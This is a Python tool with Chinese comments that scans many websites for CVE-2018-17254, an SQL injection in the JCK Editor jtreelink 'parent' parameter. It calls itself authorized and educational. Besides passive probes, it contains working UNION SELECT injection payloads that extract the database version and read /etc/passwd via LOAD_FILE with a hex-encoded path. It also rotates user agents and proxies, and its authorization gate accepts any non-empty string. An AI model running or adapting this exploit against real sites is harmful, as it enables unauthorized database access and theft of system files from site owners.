#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2018-17254 多目標測試工具（安全預檢 + 授權侵入式插件）
----------------------------------------------------------------
用途：
  在**已授權**條件下，對多個站點進行 CVE-2018-17254（JCK Editor jtreelink parent 參數 SQLi）檢測。
  • 安全預檢（預設）：端點存在性 / 基準時延 / 參數布林切換（不含注入負載）
  • 侵入式插件（需顯式啟用 + 授權聲明）：
      - UNION 版：最小揭露 DB 版本（@@version）
      - 檔案讀取：最小片段讀取 /etc/passwd（LOAD_FILE 子字串）

強制合規保護：
  執行任何「侵入式」動作必須同時滿足：
    1) --enable-invasive
    2) --execute
    3) --attestation "<授權編號/工單ID>"
    4) 目標主機在 allowlist（--allow-domain / --allowlist-file）
  否則自動跳過侵入式測試。

輸入：
  - --targets  目標清單（每行一個 base URL 或網域；無協定預設 https）
  - （可選）--proxy-file 代理清單（每行一條）

輸出：
  - CSV（--out-csv）/ JSONL（--out-jsonl）

示例：
  # 僅安全預檢
  python3 cve_2018_17254_invasive_multitest.py \
    --targets targets.txt --workers 16 --timeout 15 \
    --out-csv results.csv --out-jsonl results.jsonl --insecure

  # 含侵入式（UNION 版本號 + 讀取 /etc/passwd 前 200 Bytes）
  python3 cve_2018_17254_invasive_multitest.py \
    --targets targets.txt --workers 8 --timeout 20 \
    --enable-invasive --execute --attestation "TICKET-2025-0819-ACME" \
    --allow-domain example.com --allowlist-file scope.txt \
    --union-test --read-etc-passwd --max-bytes 200

作者：Alexia（僅供合規測試/教育用途）
"""
from __future__ import annotations

import argparse
import concurrent.futures as cf
import dataclasses
import json
import os
import random
import re
import string
import sys
import time
from dataclasses import dataclass, asdict
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# -----------------------------
# 常量
# -----------------------------
DEFAULT_ENDPOINT = "/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php"
DEFAULT_PARAM = "parent"
DEFAULT_BASELINE_REPEATS = 5
UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123 Safari/537.36",
]

RISK_HINT_NONE = "NONE"
RISK_HINT_ENDPOINT_ONLY = "ENDPOINT_PRESENT"
RISK_HINT_SIZE_DIFF = "SIZE_DIFF"
RISK_HINT_UNREACHABLE = "UNREACHABLE"

@dataclass
class DataRow:
    # 預檢欄位
    target: str
    final_url: str
    status_endpoint: Optional[int]
    resp_len_parent1: Optional[int]
    resp_len_parent0: Optional[int]
    size_delta: Optional[int]
    size_delta_ratio: Optional[float]
    baseline_avg_ms: Optional[float]
    baseline_p95_ms: Optional[float]
    baseline_raw_ms: List[float]
    hint: str
    note: str
    # 侵入式結果（授權時）
    invasive_ran: bool
    union_version: Optional[str]
    file_read_sample: Optional[str]

# -----------------------------
# 通用工具
# -----------------------------

def build_session(timeout: int, retries: int, insecure: bool, proxy: Optional[str] = None) -> requests.Session:
    s = requests.Session()
    retry = Retry(
        total=retries,
        backoff_factor=0.4,
        status_forcelist=(429, 500, 502, 503, 504),
        allowed_methods=("GET", "HEAD"),
    )
    s.mount("http://", HTTPAdapter(max_retries=retry))
    s.mount("https://", HTTPAdapter(max_retries=retry))
    s.headers.update({"User-Agent": random.choice(UA_LIST)})
    s.verify = not insecure
    if proxy:
        s.proxies.update({"http": proxy, "https": proxy})
    s.request_timeout = timeout
    return s


def norm_base(base: str) -> str:
    base = base.strip()
    if not base:
        return base
    if not base.startswith("http://") and not base.startswith("https://"):
        return f"https://{base}"
    return base


def join_url(base: str, path: str) -> str:
    return f"{base.rstrip('/')}/{path.lstrip('/')}"


def with_cache_buster(url: str) -> str:
    cb = str(int(time.time() * 1000)) + ''.join(random.choices(string.digits, k=4))
    sep = '&' if '?' in url else '?'
    return f"{url}{sep}cb={cb}"


def host_in_allowlist(url: str, allow_hosts: List[str]) -> bool:
    try:
        h = urlparse(url).hostname or ""
    except Exception:
        return False
    h = h.lower()
    return any(h == ah or h.endswith("." + ah) for ah in allow_hosts)

# -----------------------------
# 預檢（非侵入）
# -----------------------------

def check_endpoint(session: requests.Session, base: str, endpoint_path: str, param_name: str) -> Tuple[Optional[int], Optional[int], Optional[str]]:
    url = join_url(base, endpoint_path)
    params = {param_name: "1"}
    try:
        r = session.get(url, params=params, timeout=session.request_timeout, allow_redirects=True)
        return r.status_code, len(r.content or b""), r.url
    except requests.RequestException:
        return None, None, None


def baseline_latency(session: requests.Session, base: str, endpoint_path: str, param_name: str, repeats: int) -> Tuple[Optional[float], Optional[float], List[float]]:
    url = join_url(base, endpoint_path)
    params = {param_name: "1"}
    samples: List[float] = []
    for _ in range(repeats):
        try:
            t0 = time.perf_counter()
            r = session.get(with_cache_buster(url), params=params, timeout=session.request_timeout, allow_redirects=True)
            _ = r.content
            dt = (time.perf_counter() - t0) * 1000.0
            samples.append(dt)
        except requests.RequestException:
            samples.append(float("nan"))
    clean = [x for x in samples if x == x]
    if not clean:
        return None, None, samples
    clean.sort()
    avg = sum(clean) / len(clean)
    p95 = clean[int(max(0, len(clean) * 0.95 - 1))]
    return avg, p95, samples


def boolean_toggle_size_diff(session: requests.Session, base: str, endpoint_path: str, param_name: str) -> Tuple[Optional[int], Optional[int], Optional[int], Optional[float]]:
    url = join_url(base, endpoint_path)
    try:
        r1 = session.get(with_cache_buster(url), params={param_name: "1"}, timeout=session.request_timeout, allow_redirects=True)
        r0 = session.get(with_cache_buster(url), params={param_name: "0"}, timeout=session.request_timeout, allow_redirects=True)
        l1 = len(r1.content or b"")
        l0 = len(r0.content or b"")
        delta = l1 - l0
        ratio = (abs(delta) / max(1, l1)) if l1 else None
        return l1, l0, delta, ratio
    except requests.RequestException:
        return None, None, None, None

# -----------------------------
# 侵入式插件（UNION / LOAD_FILE）
# -----------------------------

def _union_payload(cols: int, expr: str, pos: int) -> str:
    # 產生類似：1 UNION SELECT NULL,expr,NULL,... -- +-
    items = ["NULL"] * cols
    pos = max(1, min(cols, pos)) - 1
    items[pos] = expr
    return "1 UNION SELECT " + ",".join(items) + "-- +-"

def try_union_version(session: requests.Session, base: str, endpoint_path: str, param_name: str, cols_list: List[int], pos_list: List[int]) -> Optional[str]:
    url = join_url(base, endpoint_path)
    for c in cols_list:
        for p in pos_list:
            val = _union_payload(c, "@@version", p)
            try:
                r = session.get(with_cache_buster(url), params={param_name: val}, timeout=session.request_timeout, allow_redirects=True)
                text = r.text or ""
                if r.status_code and 200 <= r.status_code < 400 and re.search(r"(MariaDB|MySQL|\d+\.\d+\.\d+)", text, re.I):
                    # 回傳一小段版本字串，避免大量回顯
                    m = re.search(r"([\w.-]*?MariaDB[\w.-]*|\d+\.\d+\.\d+(?:-\w+)?)", text, re.I)
                    return m.group(1)[:120] if m else text[:120]
            except requests.RequestException:
                continue
    return None

def try_load_file_passwd(session: requests.Session, base: str, endpoint_path: str, param_name: str, cols: int, pos: int, max_bytes: int) -> Optional[str]:
    url = join_url(base, endpoint_path)
    # 0x2f6574632f706173737764 == '/etc/passwd'
    expr = f"SUBSTR(LOAD_FILE(0x2f6574632f706173737764),1,{int(max_bytes)})"
    val = _union_payload(cols, expr, pos)
    try:
        r = session.get(with_cache_buster(url), params={param_name: val}, timeout=session.request_timeout, allow_redirects=True)
        if r.status_code and 200 <= r.status_code < 400:
            sample = r.text or ""
            # 粗略指紋：root:x:0:0 片段
            if "root:x:0:0" in sample or "/bin/" in sample:
                return sample[:max(120, max_bytes)]
            # 即便沒有指紋，也回傳前段供人工比對
            return sample[:max(120, max_bytes)]
    except requests.RequestException:
        return None
    return None

# -----------------------------
# 主管道
# -----------------------------

def test_one(base: str, endpoint_path: str, param_name: str, timeout: int, retries: int, insecure: bool, proxy: Optional[str],
             invasive_cfg: Dict) -> DataRow:
    b = norm_base(base)
    s = build_session(timeout=timeout, retries=retries, insecure=insecure, proxy=proxy)

    status, length_p1, final_url = check_endpoint(s, b, endpoint_path, param_name)

    hint = RISK_HINT_UNREACHABLE if status is None else (
        RISK_HINT_ENDPOINT_ONLY if (status and 200 <= status < 400) else RISK_HINT_NONE
    )

    # 基準時延
    avg_ms, p95_ms, raw_ms = baseline_latency(s, b, endpoint_path, param_name, DEFAULT_BASELINE_REPEATS)

    # 參數布林切換（安全對照）
    l1, l0, delta, ratio = boolean_toggle_size_diff(s, b, endpoint_path, param_name)
    if ratio is not None and ratio >= 0.05:
        hint = RISK_HINT_SIZE_DIFF

    note = ""
    if status and status >= 400:
        note = f"HTTP {status}"

    invasive_ran = False
    union_version = None
    file_sample = None

    # 侵入式測試 gating
    if (
        invasive_cfg.get("enable")
        and invasive_cfg.get("execute")
        and (invasive_cfg.get("attestation") or "")
        and final_url
        and host_in_allowlist(final_url, invasive_cfg.get("allow_hosts", []))
        and status and 200 <= status < 400
    ):
        invasive_ran = True
        rate_ms = invasive_cfg.get("rate_limit_ms", 1000)
        cols_list = invasive_cfg.get("union_cols_list", [8])
        pos_list = invasive_cfg.get("union_pos_list", [2])

        if invasive_cfg.get("do_union"):
            union_version = try_union_version(s, b, endpoint_path, param_name, cols_list, pos_list)
            time.sleep(rate_ms / 1000.0)
        if invasive_cfg.get("do_passwd"):
            file_sample = try_load_file_passwd(
                s, b, endpoint_path, param_name,
                cols=cols_list[0], pos=pos_list[0], max_bytes=int(invasive_cfg.get("max_bytes", 200))
            )
            time.sleep(rate_ms / 1000.0)

    return DataRow(
        target=b,
        final_url=final_url or "",
        status_endpoint=status,
        resp_len_parent1=l1,
        resp_len_parent0=l0,
        size_delta=delta,
        size_delta_ratio=ratio,
        baseline_avg_ms=avg_ms,
        baseline_p95_ms=p95_ms,
        baseline_raw_ms=[round(x, 2) if x == x else None for x in (raw_ms or [])],
        hint=hint,
        note=note,
        invasive_ran=invasive_ran,
        union_version=union_version,
        file_read_sample=file_sample,
    )


def load_lines(path: str) -> List[str]:
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]


def pick_proxy(proxy_list: Optional[List[str]]) -> Optional[str]:
    if not proxy_list:
        return None
    return random.choice(proxy_list)

# -----------------------------
# CLI
# -----------------------------

def main():
    ap = argparse.ArgumentParser(description="CVE-2018-17254 Multi-Target (Safe + Invasive with Authorization)")
    # 基本
    ap.add_argument("--targets", required=True, help="目標清單檔（每行一個 base URL 或網域）")
    ap.add_argument("--endpoint-path", default=DEFAULT_ENDPOINT, help=f"端點路徑（預設 {DEFAULT_ENDPOINT}）")
    ap.add_argument("--param-name", default=DEFAULT_PARAM, help=f"參數名稱（預設 {DEFAULT_PARAM}）")
    ap.add_argument("--workers", type=int, default=12, help="並發數（預設 12）")
    ap.add_argument("--timeout", type=int, default=15, help="單請求逾時秒數（預設 15）")
    ap.add_argument("--retries", type=int, default=1, help="自動重試次數（預設 1）")
    ap.add_argument("--proxy-file", help="Proxy 清單檔（每行一條，如 http://user:pass@host:port）")
    ap.add_argument("--out-csv", help="輸出 CSV 路徑")
    ap.add_argument("--out-jsonl", help="輸出 JSONL 路徑")
    ap.add_argument("--insecure", action="store_true", help="忽略憑證驗證（僅測試環境使用）")

    # 侵入式 gating
    ap.add_argument("--enable-invasive", action="store_true", help="啟用侵入式插件（需搭配 --execute 與 --attestation 以及 allowlist）")
    ap.add_argument("--execute", action="store_true", help="確認執行侵入式測試（無此旗標一律跳過）")
    ap.add_argument("--attestation", help="授權票據/工單編號（非空才允許）")
    ap.add_argument("--allow-domain", action="append", default=[], help="允許的目標主機/網域，可重複提供多次（例如 example.com）")
    ap.add_argument("--allowlist-file", help="允許清單檔案（每行一個網域）")
    ap.add_argument("--rate-limit-ms", type=int, default=1000, help="侵入式請求間隔毫秒（預設 1000ms）")

    # 侵入式內容選擇
    ap.add_argument("--union-test", action="store_true", help="執行 UNION 版本號最小揭露（@@version）")
    ap.add_argument("--union-cols", default="8", help="UNION 欄位數（可逗號分隔多個，如 8,7,6；預設 8）")
    ap.add_argument("--union-pos", default="2", help="回顯欄位位置（可逗號分隔，如 2,1,3；預設 2）")
    ap.add_argument("--read-etc-passwd", action="store_true", help="讀取 /etc/passwd 片段（LOAD_FILE + SUBSTR）")
    ap.add_argument("--max-bytes", type=int, default=200, help="讀取片段最大位元組（預設 200）")

    args = ap.parse_args()

    # 抑制 InsecureRequestWarning（僅 --insecure 時）
    if args.insecure:
        try:
            import urllib3
            from urllib3.exceptions import InsecureRequestWarning
            urllib3.disable_warnings(category=InsecureRequestWarning)
        except Exception:
            pass

    targets = load_lines(args.targets)
    proxies = load_lines(args.proxy_file) if args.proxy_file else None

    allow_hosts = list(args.allow_domain or [])
    if args.allowlist_file and os.path.exists(args.allowlist_file):
        allow_hosts.extend(load_lines(args.allowlist_file))
    allow_hosts = [h.lower() for h in allow_hosts]

    invasive_cfg = {
        "enable": bool(args.enable_invasive),
        "execute": bool(args.execute),
        "attestation": (args.attestation or "").strip(),
        "allow_hosts": allow_hosts,
        "rate_limit_ms": int(args.rate_limit_ms),
        "do_union": bool(args.union_test),
        "union_cols_list": [int(x) for x in str(args.union_cols).split(',') if x.strip().isdigit()],
        "union_pos_list": [int(x) for x in str(args.union_pos).split(',') if x.strip().isdigit()],
        "do_passwd": bool(args.read_etc_passwd),
        "max_bytes": int(args.max_bytes),
    }

    rows: List[DataRow] = []

    def _job(t: str) -> DataRow:
        return test_one(
            base=t,
            endpoint_path=args.endpoint_path,
            param_name=args.param_name,
            timeout=args.timeout,
            retries=args.retries,
            insecure=args.insecure,
            proxy=pick_proxy(proxies),
            invasive_cfg=invasive_cfg,
        )

    with cf.ThreadPoolExecutor(max_workers=args.workers) as ex:
        futures = [ex.submit(_job, t) for t in targets]
        for fut in cf.as_completed(futures):
            row = fut.result()
            rows.append(row)
            # 即時輸出一行摘要
            avg_str = (f"{row.baseline_avg_ms:.1f}" if (row.baseline_avg_ms is not None) else "nan")
            print(
                f"[DONE] {row.target} | status={row.status_endpoint} | len(p1/p0)={row.resp_len_parent1}/{row.resp_len_parent0} | "
                f"Δ={row.size_delta} ({(row.size_delta_ratio or 0)*100:.1f}%) | avg={avg_str}ms | "
                f"hint={row.hint} | invasive={row.invasive_ran} | version={row.union_version or '-'} | /etc/passwd={bool(row.file_read_sample)}"
            )

    # 輸出 CSV / JSONL
    if args.out_csv:
        import csv
        fieldnames = [f.name for f in dataclasses.fields(DataRow)]
        with open(args.out_csv, "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            for r in rows:
                d = asdict(r)
                d["baseline_raw_ms"] = json.dumps(d["baseline_raw_ms"], ensure_ascii=False)
                writer.writerow(d)
        print(f"[INFO] CSV written to {args.out_csv}")

    if args.out_jsonl:
        with open(args.out_jsonl, "w", encoding="utf-8") as f:
            for r in rows:
                f.write(json.dumps(asdict(r), ensure_ascii=False) + "\n")
        print(f"[INFO] JSONL written to {args.out_jsonl}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[WARN] Interrupted by user.")
        sys.exit(130)
